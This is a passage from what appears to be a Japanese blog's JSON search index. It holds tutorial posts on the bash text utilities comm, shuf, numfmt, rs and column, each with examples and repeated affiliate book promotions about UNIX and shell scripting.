定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-11-09T10:52:27+09:00","image":"https://suzukiiichiro.github.io/posts/2022-11-09-01-nl-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-11-09-01-nl-suzuki/","title":"【nl】bash/シェルスクリプトマニアックコマンドあれこれ１１"},{"content":"commコマンド commコマンドは、テキストファイルを比較するコマンドです。\ncomm ファイル1 ファイル2 で2つのテキストファイルを比較し、ファイル1だけにある行、ファイル2だけにある行、共通している行を出力します。\n比較するファイルはソートされている必要があります。\nヒント 比較するファイルはソートされている必要があるんです！ 使い方 まずは１つ目のファイル\n$ cat words.txt Apple Banana Orange India US Canada そして２つ目のファイル\n$ cat countries.txt India US Canada Japan $ comm \u0026lt;(sort words.txt | uniq) \u0026lt;(sort countries.txt | uniq) Apple Banana Canada India Japan Orange US $ ヒント \u0026lt;と(の間は空白などを含めてはいけません。 インデントで３つの区分が見えますね。\n１つ目のインデント列は、１つ目のファイルにだけあるもの、\n２つ目のインデント列は、２つ目のファイルにだけあるもの、\n３つ目のインデント列は、両方のファイルにあるもの\nです。\n共通している行だけを表示する 「-1」「-2」「-3」オプションで、「表示しない列」を指定できます。\nオプション 説明 -1 １列目（ファイル1のみに含まれる行）を出力しない -2 ２列目（ファイル2のみに含まれる行）を出力しない -3 ３列目（両方のファイルに含まれる行）を出力しない ２列目と３列目を表示しないようにします。\n１列目だけを表示、要するに１列目にだけあるものを表示します。\n$ comm -23 \u0026lt;(sort words.txt | uniq) \u0026lt;(sort countries.txt | uniq) Apple Banana Orange １列目と３列目を表示しないようにします。\n２列目だけを表示、要するに２つ目のファイルにだけあるものを表示します。\n$ comm -13 \u0026lt;(sort words.txt | uniq) \u0026lt;(sort countries.txt | uniq) Japan $ 両方のファイルにある項目を表示 １列目と２列目を表示しないようにします。\n３列目だけを表示、要するに両方のファイルに存在するものを表示します。\n$ comm -12 \u0026lt;(sort words.txt | uniq) \u0026lt;(sort countries.txt | uniq) Canada India US $ ヒント 「-1」「-2」「-3」オプションは、「表示しない列」を指定します。 書籍の紹介 UNIXという考え方—その設計思想と哲学 単行本 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-11-08T17:38:59+09:00","image":"https://suzukiiichiro.github.io/posts/2022-11-08-01-comm-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-11-08-01-comm-suzuki/","title":"【comm】bash/シェルスクリプトマニアックコマンドあれこれ１０"},{"content":"shufコマンド shufはファイルやキーボードから入力した内容をシャッフル（shuffle）して出力するコマンドです。\n乱数を扱う$RANDOMコマンドとは異なり、同じものが2回出力されることはありません。\n「1から10までの数字をランダムな順番で1回ずつ出力する」といった使い方も可能です。\n基本的な使い方 パイプから入力を受け付けた要素(行)をシャッフル(ランダムに並べ替え)するという使い方になります。\nseq 1 10 | shuf 10 3 7 1 6 9 5 2 8 4 出力する数を制限する shuf -n N で、シャッフルした各要素からN個のデータを抽出して出力させる事ができます。\n$ seq 1 10 | shuf 7 6 4 5 10 2 1 3 8 9 $ seq 1 10 | shuf -n3 8 7 4 数値の幅を制限する 001から020までをランダムに出力してみます。\nbash-5.1$ shuf -e {001..020} 006 002 016 011 018 009 008 005 017 014 004 013 010 015 019 007 003 001 012 020 bash-5.1$ さらにこの出力から５つに絞って出力します。\nbash-5.1$ shuf -e {001..020} 006 002 016 011 018 009 008 005 017 014 004 013 010 015 019 007 003 001 012 020 bash-5.1$ shuf -e {001..020} -n5 018 011 008 006 020 bash-5.1$ ヒント どんなときに使えばよいのかわかりませんが、いざというときのために（？）頭のすみっこにおいておいてください。 書籍の紹介 UNIXという考え方—その設計思想と哲学 単行本 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-11-08T15:36:21+09:00","image":"https://suzukiiichiro.github.io/posts/2022-11-08-01-shuf-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-11-08-01-shuf-suzuki/","title":"【shuf】bash/シェルスクリプトマニアックコマンドあれこれ９"},{"content":"numfmtコマンド numfmtコマンドは、数値の桁揃えや、金額を表示する場合の３桁区切りを簡単に実行できる便利コマンドです。\nnumfmt --format=\u0026quot;書式\u0026quot; 数値で、数値を書式に従って整形して表示します。\n使用できる書式は「%桁数f」と「%\u0026lsquo;f」です。\n例えば「\u0026ndash;format=\u0026quot;%5f\u0026quot;」とすると数値を5桁の幅で表示し、「\u0026ndash;format=\u0026quot;%\u0026lsquo;f\u0026quot;」では数値を3桁区切りで表示します。\n数値を桁ぞろえやカンマ区切りで表示する 123を5桁の幅で表示\nnumfmt \u0026ndash;format=\u0026quot;%5f\u0026quot; 123\n$ echo 10000 | numfmt --format=\u0026#34;%5f\u0026#34; 10000 $ 10000を3桁区切りで表示\nnumfmt \u0026ndash;format=\u0026quot;%\u0026lsquo;f\u0026quot; 10000\n$ echo 10000 | numfmt --format=\u0026#34;%\u0026#39;f\u0026#34;10,000 10,000 $ 10000を3桁区切りで8桁の幅で表示\nnumfmt \u0026ndash;format=\u0026quot;%\u0026lsquo;8f\u0026quot; 10000\n$ echo 10000 | numfmt --format=\u0026#34;%\u0026#39;8f\u0026#34; 10,000 $ ヒント これまで金額の桁区切りをawkでやっていた僕は本当に馬鹿でした。 書籍の紹介 UNIXという考え方—その設計思想と哲学 単行本 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-11-08T15:19:21+09:00","image":"https://suzukiiichiro.github.io/posts/2022-11-08-01-numfmt-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-11-08-01-numfmt-suzuki/","title":"【numfmt】bash/シェルスクリプトマニアックコマンドあれこれ８"},{"content":"rsコマンド rsコマンドは、行列を入れ替えるコマンドです。\n行列を入れ替える処理は、これはもう頻繁に起こるのです。\nそのたびに頭を悩ませることになります。\nプログラマのほとんどの人は、プログラムを書くよりもGoogleで調べる時間、\nソートのアルゴリズムを最適化するよりも、効率的な行列入れ替えのプログラムに頭を悩ませる時間のほうが多いかもしれません。\n結論。\n「行列入れ替えのプログラムを書く必要はありません、もうあります」\n行列の入れ替え 例えば以下のような表形式のテキストファイルがあるとします。\n$ cat sample.txt 1 2 3 4 5 6 7 8 9 では行列を入れ替えます。\nrs -Tコマンドで簡単に入れ替えることができます。\n$ cat sample.txt | rs -T 1 4 7 2 5 8 3 6 9 awkコマンドで頑張ってみる場合 $ cat sample.txt 1 2 3 4 5 6 7 8 9 $ cat sample.txt | awk \u0026#39; { for(i=1;i\u0026lt;=NF;i++){a[NR,i]=$i}} NF\u0026gt;p {p=NF} END{ for(j=1;j\u0026lt;=p;j++){str=a[1,j]; for(i=2;i\u0026lt;=NR;i++){str=str\u0026#34; \u0026#34;a[i,j];} print str } }\u0026#39; 1 4 7 2 5 8 3 6 9 書籍の紹介 UNIXという考え方—その設計思想と哲学 単行本 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-11-08T12:06:54+09:00","image":"https://suzukiiichiro.github.io/posts/2022-11-08-01-rs-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-11-08-01-rs-suzuki/","title":"【rs】bash/シェルスクリプトマニアックコマンドあれこれ７"},{"content":"columnコマンド 「column」はテキストを、複数の列（column）に整形するコマンドです。\n区切り文字を指定して表形式で表示する 普通のカンマ区切りのcsvファイル\n$ cat hoge.csv bar00,bar01,bar02,bar03,bar04 bar05,bar06,bar07,bar08,bar09 上記csvファイルを、columnコマンドで見やすくします。\nオプション -s で区切り文字をカンマ(,)に指定し、\nオプション -t を利用し区切り文字(,)をTABに置き換えます。\n$ column -t -s, hoge.csv bar00 bar01 bar02 bar03 bar04 bar05 bar06 bar07 bar08 bar09 書籍の紹介 UNIXという考え方—その設計思想と哲学 単行本 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 